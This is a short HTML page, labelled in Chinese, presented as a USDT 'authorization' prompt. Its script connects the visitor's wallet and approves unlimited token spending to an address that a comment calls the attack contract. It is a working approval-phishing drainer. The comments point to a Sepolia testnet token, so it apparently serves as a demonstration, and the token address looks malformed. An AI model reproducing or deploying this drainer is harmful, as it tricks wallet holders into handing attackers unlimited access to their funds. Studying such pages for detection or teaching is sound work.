
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>授權頁面</title>
</head>
<body>
  <h2>請點擊下方按鈕授權 USDT</h2>
  <button onclick="approve()">授權</button>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    const tokenAddress = "0x42A5843bF9980e0773c4f02Bd3D59b8a8f1c3fF"; // Sepolia fUSDT
    const spender = "0xfC35E3407c86461BA2D00C080cC763c0f6878377"; // 攻擊合約

    const ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    async function approve() {
      await provider.send("eth_requestAccounts", []);
      const contract = new ethers.Contract(tokenAddress, ABI, signer);
      const tx = await contract.approve(spender, ethers.constants.MaxUint256);
      console.log("授權 TX:", tx.hash);
    }
  </script>
</body>
</html>
